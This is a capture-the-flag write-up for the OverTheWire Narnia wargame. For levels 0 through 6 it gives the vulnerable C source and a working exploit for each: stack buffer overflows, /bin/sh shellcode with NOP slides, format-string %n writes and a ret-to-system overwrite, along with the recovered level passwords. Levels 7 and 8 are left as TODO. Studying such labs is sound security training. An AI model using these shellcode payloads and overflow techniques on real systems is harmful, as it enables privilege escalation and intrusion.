#  OverTheWire: Narnia

http://overthewire.org/wargames/narnia/

### Level 0 

```
root@kali:~# ssh narnia0@narnia.labs.overthewire.org -p 2226
The authenticity of host '[narnia.labs.overthewire.org]:2226 ([176.9.9.172]:2226)' can't be established.
ECDSA key fingerprint is SHA256:SCySwNrZFEHArEX1cAlnnaJ5gz2O8VEigY9X80nFWUU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[narnia.labs.overthewire.org]:2226,[176.9.9.172]:2226' (ECDSA) to the list of known hosts.
                        _       
 _ __   __ _ _ __ _ __ (_) __ _ 
| '_ \ / _` | '__| '_ \| |/ _` |
| | | | (_| | |  | | | | | (_| |
|_| |_|\__,_|_|  |_| |_|_|\__,_|
                                
a http://www.overthewire.org wargame.

narnia0@narnia.labs.overthewire.org's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

narnia0@narnia:~$ cd /narnia
narnia0@narnia:/narnia$ 
narnia0@narnia:/narnia$ ls
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
narnia0@narnia:/narnia$ cat narnia0.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

From looking at the source code this is a simple buffer overflow. The idea is overflow the buffer and overwrite val to be 0xdeadbeef.
```
narnia0@narnia:/narnia$ python -c'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef

(no shell strangely, must be closing immediately afterwards)

narnia0@narnia:/narnia$ python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat; | /narnia/narnia0     
-bash: syntax error near unexpected token `|'
narnia0@narnia:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat;) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
cat /etc/narnia_pass/narnia1
efeidiedae
```

### Level 1

```
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

This gets an environment variable called EGG, we can put some payload such as /bin/sh (http://shell-storm.org/shellcode/files/shellcode-752.php) to give us user access.
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

### Level 2

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

```
narnia2@narnia:/narnia$ gdb -q ./narnia2
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) r `python -c 'print("A"*128+"B"*4)'`
Starting program: /narnia/narnia2 `python -c 'print("A"*128+"B"*4)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB[Inferior 1 (process 105) exited normally]
...
(keep fuzzing until find segfault)
...
(gdb) r `python -c 'print("A"*140+"B"*4)'`
Starting program: /narnia/narnia2 `python -c 'print("A"*140+"B"*4)'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/200x $esp
(find the address on where 0x41414141 repeats, and pick one e.g. 0xffffd8b0)

narnia2@narnia:/narnia$ ./narnia2 `python -c 'print("\x90"*119 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\xb0\xd8\xff\xff")'`
$ cat /etc/narnia_pass/narnia3
vaequeezee

```
Once again it is [ NOPs 119 bytes | shellcode /bin/sh 21 bytes | return address back to NOP slide 4 bytes]. The NOP slide and shellcode making up the 140 bytes.

### Level 3

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h> 

int main(int argc, char **argv){
 
        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32]; 
        char buf[32];
 
        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }
 
        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }
 
        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
        /* close 'em */
        close(ifd);
        close(ofd);
 
        exit(1);
}
```

We can overwrite ofile to a file of our choice (/tmp/test/a) by overflowing ifile, which is strcpy-ied from our arg[1] input. Once you followed the code below, essentially, we read ifile which is linked to the pass. We link instead because we need to fill the buffer. Instead of the output being sent to /dev/null, we get it to be copied to a file of our choice.
```
narnia3@narnia:/narnia$ ./narnia3 asd
error opening asd
narnia3@narnia:/narnia$ mkdir /tmp/test 
narnia3@narnia:/narnia$ echo "testing" > /tmp/test/testfile
narnia3@narnia:/narnia$ ./narnia3 /tmp/test/testfile
copied contents of /tmp/test/testfile to a safer place... (/dev/null)
root@kali:~# python -c 'print("A"*32)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
narnia3@narnia:/narnia$ ./narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <---------- 32 A's
error opening 
narnia3@narnia:/narnia$ ./narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
error opening a

(exploit)
narnia3@narnia:/narnia$ mkdir -p /tmp/test/AAAAAAAAAAAAAAAAAAAAAA/tmp/test/
narnia3@narnia:/narnia$ ln -s  /etc/narnia_pass/narnia4  /tmp/test/AAAAAAAAAAAAAAAAAAAAAA/tmp/test/a
narnia3@narnia:/narnia$ touch /tmp/test/a
narnia3@narnia:/narnia$ chmod 777 /tmp/test/a
narnia3@narnia:/narnia$ ./narnia3 /tmp/test/AAAAAAAAAAAAAAAAAAAAAA/tmp/test/a
copied contents of /tmp/test/AAAAAAAAAAAAAAAAAAAAAA/tmp/test/a to a safer place... (/tmp/test/a)
narnia3@narnia:/narnia$ cat /tmp/test/a
thaenohtai
�����4����O��}0,narnia3@narnia:/narnia$ 
```

### Level 4

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}
```

`python -c 'print("\x90"*255 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff")'`

```
Starting program: /narnia/narnia4 `python -c 'print("A"*276)'`

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) x/100x $esp 
(pick an address, ideally in the middle of the A's)
narnia4@narnia:/narnia$ ./narnia4 `python -c 'print("\x90"*251 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x60\xd8\xff\xff")'`
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

### Level 5

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

This time the buffer size is checked, but it uses snprintf. This is vulnerable to format string attacks, a tutorial can be found here: https://www.exploit-db.com/docs/28476.pdf. To understand what's going on, we run a format string attack and view it in gdb.

```
narnia5@narnia:/narnia$ ./narnia5 "%x%x%x%x%x%x%x%x%x%x%x"
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7eb8116ffffffffffffd6fef7e2ec346265376636313138666666666666666] (63) <---------------- notice that these addresses, e.g. the first address f7eb8116 is the same as where snprint is, indicated lower down 
i = 1 (0xffffd71c)
narnia5@narnia:/narnia$ gdb -q ./narnia5
Reading symbols from ./narnia5...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080484bd <+0>:	push   %ebp
   0x080484be <+1>:	mov    %esp,%ebp
   0x080484c0 <+3>:	and    $0xfffffff0,%esp
   0x080484c3 <+6>:	sub    $0x60,%esp
   0x080484c6 <+9>:	movl   $0x1,0x5c(%esp)
   0x080484ce <+17>:	mov    0xc(%ebp),%eax
   0x080484d1 <+20>:	add    $0x4,%eax
   0x080484d4 <+23>:	mov    (%eax),%eax
   0x080484d6 <+25>:	mov    %eax,0x8(%esp)
   0x080484da <+29>:	movl   $0x40,0x4(%esp)
   0x080484e2 <+37>:	lea    0x1c(%esp),%eax
   0x080484e6 <+41>:	mov    %eax,(%esp)
   0x080484e9 <+44>:	call   0x80483b0 <snprintf@plt>
   0x080484ee <+49>:	movb   $0x0,0x5b(%esp)
   0x080484f3 <+54>:	movl   $0x8048610,(%esp)
   0x080484fa <+61>:	call   0x8048350 <printf@plt>
   0x080484ff <+66>:	mov    0x5c(%esp),%eax
   0x08048503 <+70>:	cmp    $0x1f4,%eax <------- compare instruction to check the %eax register's value against 0x1fa (500).
   0x08048508 <+75>:	jne    0x8048522 <main+101>
   0x0804850a <+77>:	movl   $0x8048631,(%esp)
   0x08048511 <+84>:	call   0x8048360 <puts@plt>
   0x08048516 <+89>:	movl   $0x8048636,(%esp)
   0x0804851d <+96>:	call   0x8048370 <system@plt>
   0x08048522 <+101>:	movl   $0x8048640,(%esp)
   0x08048529 <+108>:	call   0x8048360 <puts@plt>
   0x0804852e <+113>:	lea    0x1c(%esp),%eax
   0x08048532 <+117>:	mov    %eax,(%esp)
   0x08048535 <+120>:	call   0x8048390 <strlen@plt>
   0x0804853a <+125>:	mov    %eax,0x8(%esp)
   0x0804853e <+129>:	lea    0x1c(%esp),%eax
   0x08048542 <+133>:	mov    %eax,0x4(%esp)
   0x08048546 <+137>:	movl   $0x8048661,(%esp)
   0x0804854d <+144>:	call   0x8048350 <printf@plt>
   0x08048552 <+149>:	mov    0x5c(%esp),%eax
   0x08048556 <+153>:	lea    0x5c(%esp),%edx
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b *0x080484e9
Breakpoint 1 at 0x80484e9
(gdb) r `python -c 'print "%x%x%x%x%x%x%x%x"'`
Starting program: /narnia/narnia5 `python -c 'print "%x%x%x%x%x%x%x%x"'`

Breakpoint 1, 0x080484e9 in main ()
(gdb) x/20x $esp
0xffffd6b0:	0xffffd6cc	0x00000040	0xffffd8ed	0xf7eb8116 <----------------------- over here
0xffffd6c0:	0xffffffff	0xffffd6ee	0xf7e2ec34	0xf7e54fe3
0xffffd6d0:	0x00000000	0x002c307d	0x00000001	0x08048319
0xffffd6e0:	0xffffd8dd	0x0000002f	0x08049858	0x080485d2
0xffffd6f0:	0x00000002	0xffffd7b4	0xffffd7c0	0xf7e5519d
(gdb) 

(interesting, but from the format strings attack tutorial, we can do better)

narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "AAAA" + "%08x."*5'`  <------- minimum of 5 to get 41414141, the same as AAAA
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7eb8116.ffffffff.ffffd6ee.f7e2ec34.41414141.] (49)
i = 1 (0xffffd70c)

narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x0c\xd7\xff\xff" + "%08x."*4 + "%n"'`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [,���f7eb8116.ffffffff.ffffd6fe.f7e2ec34.] (40)
i = 1 (0xffffd71c)
Segmentation fault (core dumped)

narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x1c\xd7\xff\xff" + "%08x."*4 + "%n"'`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���f7eb8116.ffffffff.ffffd6fe.f7e2ec34.] (40)
i = 40 (0xffffd71c)
narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x1c\xd7\xff\xff" + "A"*460 + "%08x."*4 + "%n"'`
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd54c)
narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x4c\xd5\xff\xff" + "A"*460 + "%08x."*4 + "%n"'`
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng

or using the %u specifier to increase the width of the output

narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x1c\xd7\xff\xff" + "%08x."*3 + "%500u" + "%n"'` <---- 500u takes a place space over one of the %x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���f7eb8116.ffffffff.ffffd6fe.                                ] (63)
i = 531 (0xffffd71c)
narnia5@narnia:/narnia$ ./narnia5 `python -c 'print "\x1c\xd7\xff\xff" + "%08x."*3 + "%469u" + "%n"'`
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

### Level 6

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}
```

This is a buffer overflow at strcpy. The aim is to overflow b1 return address to point to system command to execute our /bin/sh.

```
(gdb) r `python -c 'print ("A"*8 + " " + "B"*8)'`
Starting program: /narnia/narnia6 `python -c 'print ("A"*8 + " " + "B"*8)'`

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) r `python -c 'print ("A"*9 + " " + "B"*8)'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia6 `python -c 'print ("A"*9 + " " + "B"*8)'`

Program received signal SIGSEGV, Segmentation fault.
0x08040041 in ?? ()
(gdb) r `python -c 'print ("A"*12 + " " + "B"*8)'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia6 `python -c 'print ("A"*12 + " " + "B"*8)'`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e61e70 <system>

narnia6@narnia:/narnia$ ./narnia6 `python -c 'print "/bin/sh;" + "\x70\x1e\xe6\xf7" + " " + "B"'`
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
$ 

```

### Level 7

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;
  
        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);
        
        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	fflush(stdout);
        system("/bin/sh");

        return 0;
}
```

```
(gdb) r AAAA
Starting program: /narnia/narnia7 AAAA
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd67c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
[Inferior 1 (process 76) exited normally]

```
TODO

### Level 8

TODO
